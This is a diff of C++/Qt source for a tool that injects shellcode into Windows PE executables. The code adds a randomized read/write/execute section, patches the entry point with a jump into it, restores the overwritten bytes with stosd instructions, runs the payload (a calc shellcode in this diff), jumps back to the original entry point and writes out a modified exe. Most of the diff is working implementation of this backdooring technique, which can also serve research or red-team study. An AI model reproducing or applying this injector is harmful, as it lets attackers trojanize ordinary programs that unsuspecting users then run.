@@ -1,5 +1,6 @@
 #include "morph_executable_controller.h"
 #include "file_reader.h"
+#include "file_saver.h"
 #include <stdio.h>
 
 //constructor
@@ -7,9 +8,8 @@ Morph_Executable_Controller::Morph_Executable_Controller()
 {
     this->cur_wind = MainWindow::getMWptr();
     this->buffer = std::vector<char>();
-    this->file_name = QString("");
-    this->file_path = QString("");
-    this->exe_name = QString("");
+    this->exe_file_path = QString("");
+    this->morphed_exe_name = QString("");
     this->dos_header_pointer = nullptr;
     this->image_NT_header_ptr = nullptr;
     this->image_NT_header_file_cursor = 0;
@@ -32,11 +32,13 @@ Morph_Executable_Controller::Morph_Executable_Controller()
     this->payload_raw_address = 0;
     this->payload_virtual_address = 0;
     this->machine_code_num_of_bytes = 0;
-    this->entry_point_to_patch = 0;
+    this->starting_of_text_section_offset_on_load = 0;
     this->image_base = 0;
-    this->section_pivot_gadget_byte_length = 0;
+    this->jump_to_payload_byte_length = 0;
     this->text_section_buffer_ptr = nullptr;
     this->text_section_buffer_original = nullptr;
+    this->num_of_stosd = 0;
+    this->buffer_cursor = 0;
 
 }
 
@@ -79,27 +81,17 @@ QString Morph_Executable_Controller::morph_exe_no_encryption(QString exe_file_pa
 {
     QString status = "";
     //reading bytes of a exe file
-    qDebug() << "STARTING MORPH ";
     status = read_file_into_vector(exe_file_path);
-    if (status == ERROR_INVALID_EXECUTABLE)
-    {
-        QMessageBox::warning(cur_wind, "Warning",
-                             "Invalid exe file: " + exe_file_path);
-        return status;
-    }
+    error_warning_message_box(status);
+
     //get image dos header pointer
     //image_dos_header_file_cursor is at offset 0 as this pe header is located at the first offset of the exe
     this->dos_header_pointer = get_ptr_image_dos_header(this->buffer,this->image_dos_header_file_cursor);
 
     //validate the image dos header must be equals to MZ(ASCII)
-    if(!validate_image_dos_signature(dos_header_pointer))
-    {
-        QMessageBox::warning(cur_wind, "Warning",
-                             "Invalid DOS Signature");
+    status = validate_image_dos_signature(dos_header_pointer);
+    error_warning_message_box(status);
 
-        status = ERROR_INVALID_DOS_SIGNATURE;
-        return status;
-    }
 
     // getting image_NT_header_cursor and setting exe_header_file_offset
     // Here we are assuming that buffer has the same bytes as the original file
@@ -113,14 +105,9 @@ QString Morph_Executable_Controller::morph_exe_no_encryption(QString exe_file_pa
     this->image_NT_header_ptr = get_ptr_image_NT_header(this->buffer,image_NT_header_file_cursor);
 
     //validate the file PE signature must be equal to some dog shit
-    if(!validate_PE_signature(image_NT_header_ptr))
-    {
-        QMessageBox::warning(cur_wind, "Warning",
-                             "Invalid PE Signature");
+    status = validate_PE_signature(image_NT_header_ptr);
+    error_warning_message_box(status);
 
-        status = ERROR_INVALID_PE_SIGNATURE;
-        return status;
-    }
 
     printf("Before: Number of Sections : 0x%x\n", this->image_NT_header_ptr->FileHeader.NumberOfSections);
     //increasing the number of sections to allocate memory for payload
@@ -128,7 +115,8 @@ QString Morph_Executable_Controller::morph_exe_no_encryption(QString exe_file_pa
     printf("After: Number of Sections : 0x%x\n", this->image_NT_header_ptr->FileHeader.NumberOfSections);
 
     //randomizing the new payload section name
-     const std::string payload_section_name = randomize_payload_section_name();
+    const std::string payload_section_name = randomize_payload_section_name();
+
 
      //this is the entry point when the pe file is loaded to virtual memory
     //must add image base + the address of entry point
@@ -149,12 +137,7 @@ QString Morph_Executable_Controller::morph_exe_no_encryption(QString exe_file_pa
 
     //getting the index of the .text section inside the image_section_header_vec
     status = get_section_header_index_by_name(TEXT_SECTION_NAME, image_section_header_vec,image_NT_header_ptr,index_of_text_section);
-    if (status == ERROR_NO_MATCHING_SECTION_HEADER_NAME)
-    {
-        QMessageBox::warning(cur_wind, "Warning",
-                             "No matching section header name for \".text\"");
-        return status;
-    }
+    error_warning_message_box(status);
 
     //getting the raw data offset of the .text section via image_section_header_vec
     //note that the above function saved the index of the .text section
@@ -178,12 +161,7 @@ QString Morph_Executable_Controller::morph_exe_no_encryption(QString exe_file_pa
     //getting the index of the .payload section inside the image_section_header_vec
     status = get_section_header_index_by_name(payload_section_name, image_section_header_vec,
                                               image_NT_header_ptr,index_of_payload_section);
-    if (status == ERROR_NO_MATCHING_SECTION_HEADER_NAME)
-    {
-        QMessageBox::warning(cur_wind, "Warning",
-                             "No matching section header name for \".payload\"");
-        return status;
-    }
+    error_warning_message_box(status);
 
     //storing the whole .payload section inside the payload_section_header_ptr
     this->payload_section_header_ptr = image_section_header_vec[index_of_payload_section];
@@ -195,12 +173,17 @@ QString Morph_Executable_Controller::morph_exe_no_encryption(QString exe_file_pa
     switch(chosen_payload_index)
     {
         case 0:
+            set_morphed_exe_name(exe_file_path,"_CALC");
             this->payload_num_of_bytes = sizeof(CALC_SHELLCODE) - 1; //the -1 is to get rid of terminating character
+            populate_payload_vec(this->payload_vec,CALC_SHELLCODE,this->payload_num_of_bytes);
             break;
 
         default:
             break;
     }
+
+    //setting the full file path
+    set_morphed_exe_file_path(exe_file_path);
 
     //calculate the file alignment factor to align the section
     calculate_file_alignment_factor(this->payload_num_of_bytes,this->file_alignment,this->file_alignment_factor);
@@ -240,59 +223,157 @@ QString Morph_Executable_Controller::morph_exe_no_encryption(QString exe_file_pa
 
     //this is the section pivot gadget for the payload section,
     //which is used to patch back the .text section
-    this->entry_point_to_patch = this->image_NT_header_ptr->OptionalHeader.AddressOfEntryPoint -
+    //currently this value is when the PE is loaded, hence we add the raw data offset of the text section
+    this->starting_of_text_section_offset_on_load = this->image_NT_header_ptr->OptionalHeader.AddressOfEntryPoint -
                                     this->image_NT_header_ptr->OptionalHeader.BaseOfCode +
                                     this->text_section_raw_data_offset;
 
     //getting image base via image_NT_header_ptr optional header
     this->image_base = this->image_NT_header_ptr->OptionalHeader.ImageBase;
 
-    //writing assembly syntax, for entry point patching (section pivot gadget), into string
-    std::string section_pivot_gadget_asm = "mov ecx, ";
-    section_pivot_gadget_asm += convert_num_to_hex<DWORD>(this->image_base + this->payload_virtual_address) + ";";
-    section_pivot_gadget_asm += "jmp ecx;";
+    //writing assembly syntax, for jumping to payload section (section pivot gadget), into string
+    std::string jump_to_payload_asm = "mov ecx, ";
+    jump_to_payload_asm += convert_num_to_hex<DWORD>(this->image_base + this->payload_virtual_address) + ";";
+    jump_to_payload_asm += "jmp ecx;";
+    this->machine_code_vec.clear(); //clear vector to input new machine code
 
-
-    //converting assembly syntax into machine code
-    const char* section_pivot_gadget_char = section_pivot_gadget_asm.c_str();
-        std::cout << "BEFORE ASSEMBLING" << std::endl;
-    this->machine_code_vec.clear();
-            std::cout << "BEFORE ASSEMBLING2" << std::endl;
-    status = asm_to_machine_code(section_pivot_gadget_char,this->machine_code_vec,this->machine_code_num_of_bytes);
-    if(status != SUCCESS_ASSEMBLY_TO_MACHINE_CODE_KEYSTONE)
-    {
-        std::cout << "ERROR" << std::endl;
-    }
-    std::cout << "AFTER ASSEMBLING" << std::endl;
-
-    delete section_pivot_gadget_char;//deleting the char*
-
+    //and converting assembly syntax into machine code
+    status = asm_to_machine_code(jump_to_payload_asm,this->machine_code_vec,this->machine_code_num_of_bytes);
+    error_warning_message_box(status);
 
     //storing the byte length of the section pivot gadget
-    this->section_pivot_gadget_byte_length = this->machine_code_num_of_bytes;
+    this->jump_to_payload_byte_length = this->machine_code_num_of_bytes;
 
-
+    //putting original text section data into a pointer, to be added into the buffer later
     this->text_section_buffer_original = get_section_data_from_buffer(this->buffer,
                                                                       this->text_section_raw_data_offset,
                                                                       this->size_of_text_section);
+    //storing the original text section into a pointer, for calculation
     this->text_section_buffer_ptr = this->text_section_buffer_original;
 
-    /*
-    char* fileTextSectionBuffer = getTextSectionDataFromFileBuffer(buffer, RawDataOffsetTextSection, textSectionSize);
-    char * fileTextSectionBufferPtr = fileTextSectionBuffer;
-    for (int i = 0; i < sectionPivotGadgetLength; i++)
-    {
-        *(fileTextSectionBufferPtr + (patchingEntryPoint - RawDataOffsetTextSection)) = encode[i];
-        fileTextSectionBufferPtr++;
-    }
 
-    populateSectionNBuffer(fileTextSectionBufferPtr, reinterpret_cast<char*>(encode.data()), sectionPivotGadgetLength);
-    */
+    //editing the pointer text_section_buffer_ptr to store the jump to payload instruction bytes
+    //will be used to put into the actual buffer later
+    //starting_of_text_section_offset_on_load must subtract by the text_section_raw_data_offset
+    //to get to the physical memory of the buffer
+    editing_text_section_ptr(this->text_section_buffer_ptr,
+                             this->jump_to_payload_byte_length,
+                             this->starting_of_text_section_offset_on_load - this->text_section_raw_data_offset,
+                             this->machine_code_vec);
 
-    //print_section_headers(image_section_header_vec);
+	//populate_section_ptr(text_section_buffer_ptr, reinterpret_cast<char*>(machine_code_vec.data()), jump_to_payload_byte_length);
+
+    //here we memorize the original bytes of the text section
+    //this will be used in the payload section to patch back the overwritten text section bytes
+    std::string text_section_memorized_entry_bytes = "";
+
+    //stosd can only store a certain amount of dwords
+    //this is to calculate how many stosd we need
+    //storing the original entry bytes from the buffer to text_section_memorized_entry_bytes
+    calculate_num_of_stosd_for_patching(text_section_memorized_entry_bytes,
+                                        this->num_of_stosd,
+                                        this->jump_to_payload_byte_length,
+                                        this->starting_of_text_section_offset_on_load,
+                                        this->buffer);
+
+
+
+    //getting the stosd instructions asm, afew calculations must be done for big to little endian conversion
+    std::string patching_entry_bytes_asm = "";
+    get_stosd_instruction_asm(patching_entry_bytes_asm,
+                              text_section_memorized_entry_bytes,
+                              this->num_of_stosd);
+
+    //converting patching_entry_bytes_asm to machine code
+    machine_code_vec.clear();
+    asm_to_machine_code(patching_entry_bytes_asm,machine_code_vec,this->machine_code_num_of_bytes);
+
+    //stores the payload into a variable char* and the ptr is to do calculation
+    char *payload_section_buffer_original = new char [this->payload_raw_data_size];
+    char *payload_section_buffer_ptr = payload_section_buffer_original;
+
+    //writing the machine code into payload_section_buffer_ptr
+    //this will be used later to write back to the buffer
+    populate_section_ptr(payload_section_buffer_ptr,
+                                reinterpret_cast<char*>(this->machine_code_vec.data()),
+                                this->machine_code_num_of_bytes);
+
+    //putting in the payload into payload_section_buffer_ptr
+    populate_section_ptr(payload_section_buffer_ptr,
+                         reinterpret_cast<char*>(this->payload_vec.data()),
+                         this->payload_num_of_bytes);
+
+    //getting the asm instructions to jump back to the text section
+    std::string jump_back_to_text_section_asm = "";
+    get_jump_back_to_text_section_instruction_asm(jump_back_to_text_section_asm
+                                                  ,this->entry_point_of_text_section);
+
+    //converting the above asm instructions to machine code
+    machine_code_vec.clear();
+    asm_to_machine_code(jump_back_to_text_section_asm,this->machine_code_vec,
+                        this->machine_code_num_of_bytes);
+
+    //putting in the jump back to text section into payload_section_buffer_ptr
+    populate_section_ptr(payload_section_buffer_ptr,
+                         reinterpret_cast<char*>(this->machine_code_vec.data()),
+                         this->machine_code_num_of_bytes);
+
+
+
+    //===================================================================================
+    rewrite_bytes_to_buffer(this->buffer, (char*)this->dos_header_pointer,
+                            this->buffer_cursor,sizeof(IMAGE_DOS_HEADER));
+    //replacing back the edited image_NT_header_ptr into the buffer
+    //number of sections was increased by 1
+    //new size of the pe file was set
+    //by adding the payload_virtual_size to SizeOfImage
+    this->buffer_cursor = this->exe_header_file_offset;
+    rewrite_bytes_to_buffer(this->buffer, (char*)this->image_NT_header_ptr,
+                            this->buffer_cursor,sizeof(IMAGE_NT_HEADERS32));
+
+    //need to be used to find the payload section later
+    unsigned int start_of_section_headers_offset = this->buffer_cursor + sizeof(IMAGE_NT_HEADERS32);
+
+    //need to add the cursor + the size of IMAGE_NT_HEADERS32 + the index_of_text_section * size of IMAGE_SECTION_HEADER
+    this->buffer_cursor = start_of_section_headers_offset + (this->index_of_text_section * sizeof(IMAGE_SECTION_HEADER));
+    //this->buffer_cursor += this->index_of_text_section * sizeof(IMAGE_SECTION_HEADER);
+    rewrite_bytes_to_buffer(this->buffer, (char*)this->text_section_header_ptr,
+                            this->buffer_cursor,sizeof(IMAGE_SECTION_HEADER));
+
+    //putting in the new payload section header
+    //payload raw address is previous raw size + previous raw data offset
+    //payload raw data size was calculated via file_alignment
+    //payload virtual size is calculated via section alignment
+    //payload virtual address is previous virtual address + payloads virtual size
+    //payload characteristics is set to read/write/execute
+    this->buffer_cursor = start_of_section_headers_offset + (this->index_of_payload_section * sizeof(IMAGE_SECTION_HEADER));
+    rewrite_bytes_to_buffer(this->buffer, (char*)this->payload_section_header_ptr,
+                            this->buffer_cursor,sizeof(IMAGE_SECTION_HEADER));
+
+    //need to resize buffer to accomodate the new payload section
+    __int64 new_buffer_size = this->buffer.size() + this->payload_raw_data_size;
+    this->buffer.resize(new_buffer_size);
+
+    //start at the payload_section_header_ptr pointer to raw data
+    //putting in the payload into buffer
+    this->buffer_cursor = this->payload_section_header_ptr->PointerToRawData;
+    rewrite_bytes_to_buffer(this->buffer, (char*)payload_section_buffer_original,
+                            this->buffer_cursor,this->payload_raw_data_size);
+
+    this->buffer_cursor = this->text_section_raw_data_offset;
+    rewrite_bytes_to_buffer(this->buffer, (char*)this->text_section_buffer_original,
+                            this->buffer_cursor,this->size_of_text_section);
+
+
+     print_section_headers(image_section_header_vec);
+    //writing to file
+    write_exe_file(this->morphed_exe_file_path, this->buffer);
+    //free memory
+    delete[] payload_section_buffer_original;
+    payload_section_buffer_ptr = nullptr;
+    delete payload_section_buffer_ptr;
 
     std::cout << std::endl;
-    std::cout << "its over" << std::endl;
 
     return SUCCESS_MORPHED_EXECUTABLE;
 }
@@ -300,6 +381,7 @@ QString Morph_Executable_Controller::morph_exe_no_encryption(QString exe_file_pa
 //morphing section supporting/utility functions
 QString Morph_Executable_Controller::read_file_into_vector(QString exe_file_path)
 {
+    this->exe_file_path = exe_file_path;
     File_Reader reader;
     return reader.read_file_into_vector(exe_file_path,this->buffer);
 }
@@ -315,9 +397,14 @@ PIMAGE_DOS_HEADER Morph_Executable_Controller::get_ptr_image_dos_header(std::vec
     return (PIMAGE_DOS_HEADER)extracted_dos_header;
 }
 
-bool Morph_Executable_Controller::validate_image_dos_signature(PIMAGE_DOS_HEADER &dos_header_pointer)
+QString Morph_Executable_Controller::validate_image_dos_signature(PIMAGE_DOS_HEADER &dos_header_pointer)
 {
-    return (dos_header_pointer->e_magic == IMAGE_DOS_SIGNATURE);
+    if (dos_header_pointer->e_magic == IMAGE_DOS_SIGNATURE)
+    {
+        return SUCCESS_VALID_DOS_SIGNATURE;
+    }
+
+    return ERROR_INVALID_DOS_SIGNATURE;
 }
 
 PIMAGE_NT_HEADERS32 Morph_Executable_Controller::get_ptr_image_NT_header(std::vector<char>&buffer, unsigned int image_NT_header_file_cursor)
@@ -331,9 +418,14 @@ PIMAGE_NT_HEADERS32 Morph_Executable_Controller::get_ptr_image_NT_header(std::ve
     return (PIMAGE_NT_HEADERS32)extracted_NT_header;
 }
 
-bool Morph_Executable_Controller::validate_PE_signature(PIMAGE_NT_HEADERS32 &image_NT_header_ptr)
+QString Morph_Executable_Controller::validate_PE_signature(PIMAGE_NT_HEADERS32 &image_NT_header_ptr)
 {
-    return (image_NT_header_ptr->Signature == IMAGE_NT_SIGNATURE);
+    if (image_NT_header_ptr->Signature == IMAGE_NT_SIGNATURE)
+    {
+        return SUCCESS_VALID_PE_SIGNATURE;
+    }
+
+    return ERROR_INVALID_PE_SIGNATURE;
 }
 
 std::string Morph_Executable_Controller::randomize_payload_section_name()
@@ -470,16 +562,15 @@ void Morph_Executable_Controller::print_section_headers(std::vector<PIMAGE_SECTI
     }
 }
 
-QString Morph_Executable_Controller::asm_to_machine_code(const char * code, std::vector<unsigned char>& machine_code, size_t &machine_code_num_of_bytes)
+QString Morph_Executable_Controller::asm_to_machine_code(std::string asm_code, std::vector<unsigned char>& machine_code, size_t &machine_code_num_of_bytes)
 {
-    std::cout << "asm1\n";
-
     ks_engine* ks;
+    const char* code = asm_code.c_str();
     ks_err err;
     size_t count = 0;
     unsigned char *encode;
     err = ks_open(KS_ARCH_X86, KS_MODE_32, &ks);
-    std::cout << "asm2\n";
+
     if (err != KS_ERR_OK)
     {
         printf("ERROR: failed on ks_open(), quit\n");
@@ -491,17 +582,15 @@ QString Morph_Executable_Controller::asm_to_machine_code(const char * code, std:
             count, ks_errno(ks));
         return ERROR_ASSEMBLY_FAILED_KEYSTONE;
     }
-    else
+
+    printf("%s = ", code);
+    for (int i = 0; i < machine_code_num_of_bytes; i++)
     {
-        printf("%s = ", code);
-        for (int i = 0; i < machine_code_num_of_bytes; i++)
-        {
-            printf("%02x ", encode[i]);
-            machine_code.push_back(encode[i]);
-        }
-        printf("\n");
-        printf("Compiled: %lu bytes, statements: %lu\n", machine_code_num_of_bytes, count);
+        printf("%02x ", encode[i]);
+        machine_code.push_back(encode[i]);
     }
+    printf("\n");
+    printf("Compiled: %lu bytes, statements: %lu\n", machine_code_num_of_bytes, count);
 
     // NOTE: free encode after usage to avoid leaking memory
     ks_free(encode);
@@ -520,4 +609,199 @@ char* Morph_Executable_Controller::get_section_data_from_buffer(std::vector <cha
         section[i] = buffer[file_offset + i];
     }
     return section;
+}
+
+void Morph_Executable_Controller::editing_text_section_ptr(char *&text_section_buffer_ptr, unsigned int jump_to_payload_byte_length, DWORD text_section_buffer_offset, std::vector<unsigned char> &machine_code_vec)
+{
+    //editing the pointer text_section_buffer_ptr to store the jump to payload instruction bytes
+    //will be used to put into the actual buffer later
+    for(int i = 0; i < jump_to_payload_byte_length; i++)
+    {
+        *(text_section_buffer_ptr + (text_section_buffer_offset)) = machine_code_vec[i];
+        text_section_buffer_ptr++;
+    }
+
+}
+
+void Morph_Executable_Controller::calculate_num_of_stosd_for_patching(std::string &text_section_memorized_entry_bytes,
+                                                                      unsigned int &num_of_stosd,
+                                                                      unsigned int jump_to_payload_byte_length,
+                                                                      DWORD starting_of_text_section_offset,
+                                                                      std::vector<char> &buffer)
+{
+    //stosd can only store a certain amount of dwords
+    //this is to calculate how many stosd we need
+    num_of_stosd = jump_to_payload_byte_length / sizeof(DWORD);
+    if(jump_to_payload_byte_length % sizeof(DWORD) != 0)
+    {
+        num_of_stosd++;
+    }
+
+    //storing the original entry bytes from the buffer to text_section_memorized_entry_bytes
+    for(int i = 0 ; i < sizeof(DWORD) * num_of_stosd; i++)
+    {
+        text_section_memorized_entry_bytes += buffer[starting_of_text_section_offset + i];
+    }
+}
+
+void Morph_Executable_Controller::get_stosd_instruction_asm(std::string &patching_entry_bytes_asm,
+                               std::string text_section_memorized_entry_bytes,
+                               unsigned int num_of_stosd)
+{
+    if (text_section_memorized_entry_bytes.length() != 0)
+    {
+        for (int i = 0; i < num_of_stosd; i++)
+        {
+            //starting of patching entry bytes asm
+            //need to store the original bytes of the text section
+            patching_entry_bytes_asm += "mov eax, ";
+
+            std::string big_endian_byte_string = "";
+            for (int j = 0; j < sizeof(DWORD); j++)
+            {
+                if (j % sizeof(DWORD) == 0 && j != 0)
+                {
+                    //if correct format, no need to use this forloop to convert
+                    break;
+                }
+
+                //upper and lower nibbles of a byte
+                int upper, lower;
+                char hex_array[16] = { '0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f' };
+
+                upper = (text_section_memorized_entry_bytes[sizeof(DWORD)*i + j]);
+                upper = (upper >> 4) & 0xf;//right shift and to zero off the leading 0s
+                lower = text_section_memorized_entry_bytes[sizeof(DWORD)*i + j] & 0xf;//zero off the leading 0s
+
+                //stored as big endian
+                big_endian_byte_string += hex_array[upper];
+                big_endian_byte_string += hex_array[lower];
+            }
+            //convert big endian to little endian because its 32 bit
+            unsigned long hex_to_convert_to_little_endian = std::stoul(big_endian_byte_string, 0, 16);
+            unsigned long hex_upper_lower_to_little_endian = _byteswap_ulong(hex_to_convert_to_little_endian);
+            patching_entry_bytes_asm += convert_num_to_hex(hex_upper_lower_to_little_endian) + ";";
+            patching_entry_bytes_asm += "stosd;";
+        }
+    }
+
+}
+
+void Morph_Executable_Controller::populate_section_ptr(char *&section_ptr, char *machine_code, unsigned int size_of_machine_code)
+{
+    for (int i = 0; i < size_of_machine_code; i++)
+    {
+        *section_ptr = machine_code[i];
+        section_ptr++;
+    }
+}
+
+void Morph_Executable_Controller::populate_payload_vec(std::vector<unsigned char> &payload_vec, const char *payload_shell_code, unsigned int payload_num_of_bytes)
+{
+    for (int i = 0; i < payload_num_of_bytes; i++)
+    {
+        payload_vec.emplace_back(payload_shell_code[i]);
+    }
+}
+
+std::string Morph_Executable_Controller::convert_byte_to_string(char byte)
+{
+    std::string result = "0x";
+
+    char hex_array[16] = { '0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f' };
+
+    for (int i = 0; i < sizeof(BYTE); i++)
+    {
+                        //upper and lower nibbles of a byte
+        int upper, lower;
+        upper = (byte >> 4) & 0xf;//right shift and to zero off the leading 0s
+        lower = byte & 0xf;//zero off the leading 0s
+        result += hex_array[upper];
+        result += hex_array[lower];
+    }
+
+    return result;
+}
+
+void Morph_Executable_Controller::get_jump_back_to_text_section_instruction_asm(std::string &jump_back_to_text_section_asm, DWORD entry_point_of_text_section)
+{
+    jump_back_to_text_section_asm = "mov eax, " +
+            convert_num_to_hex<DWORD>(entry_point_of_text_section)
+            + ";";
+    jump_back_to_text_section_asm += "jmp eax;";
+}
+
+void Morph_Executable_Controller::rewrite_bytes_to_buffer(std::vector<char> &buffer, char *section_buffer_ptr,
+                             unsigned int offset, unsigned int byte_size)
+{
+    for (int i = 0; i < byte_size; i++)
+    {
+        buffer[offset + i] = section_buffer_ptr[i];
+    }
+}
+
+void Morph_Executable_Controller::set_morphed_exe_file_path(QString exe_file_path)
+{
+
+    std::string original_exe_file_path = exe_file_path.toStdString().substr(0,exe_file_path.toStdString().find_last_of("/")+1);
+    original_exe_file_path += this->morphed_exe_name.toStdString();
+    std::cout << original_exe_file_path << std::endl;
+    this->morphed_exe_file_path = QString(original_exe_file_path.c_str());
+}
+
+void Morph_Executable_Controller::set_morphed_exe_name(QString exe_file_path,std::string modifier)
+{
+    std::string original_exe_name = exe_file_path.toStdString().substr(exe_file_path.toStdString().find_last_of("/")+1,exe_file_path.length());
+
+    std::size_t symbol = original_exe_name.find_last_of(".");
+    std::string exe_name_no_extension = original_exe_name.substr(0,symbol);
+
+    std::string new_exe_name = exe_name_no_extension + modifier + ".exe";
+    this->morphed_exe_name = QString(new_exe_name.c_str());
+}
+
+void Morph_Executable_Controller::write_exe_file(QString morphed_exe_file_path, std::vector<char> &buffer)
+{
+    File_Saver saver;
+    saver.write_exe_file(morphed_exe_file_path,buffer);
+}
+
+
+void Morph_Executable_Controller::error_warning_message_box(QString status)
+{
+    if (status == ERROR_INVALID_EXECUTABLE)
+    {
+        QMessageBox::warning(cur_wind, "Warning",
+                             "Invalid exe file: " + this->exe_file_path);
+    }
+    else if (status == ERROR_INVALID_DOS_SIGNATURE)
+    {
+        QMessageBox::warning(cur_wind, "Warning",
+                             "Invalid DOS Signature");
+    }
+    else if (status == ERROR_INVALID_PE_SIGNATURE)
+    {
+        QMessageBox::warning(cur_wind, "Warning",
+                             "Invalid PE Signature");
+    }
+    else if (status == ERROR_NO_MATCHING_SECTION_HEADER_NAME)
+    {
+        QMessageBox::warning(cur_wind, "Warning",
+                             "No matching section header name for \".text\"");
+    }
+    else if (status == ERROR_NO_MATCHING_SECTION_HEADER_NAME)
+    {
+        QMessageBox::warning(cur_wind, "Warning",
+                             "No matching section header name for \".payload\"");
+    }
+    else if(status == ERROR_OPENING_KEYSTONE)
+    {
+        QMessageBox::warning(cur_wind, "Warning",
+                             "Error opening keystone");
+    }
+    else if (status == ERROR_ASSEMBLY_FAILED_KEYSTONE)
+    {
+        QMessageBox::warning(cur_wind, "Warning",
+                             "Failed to assemble in keystone");
+    }
 }
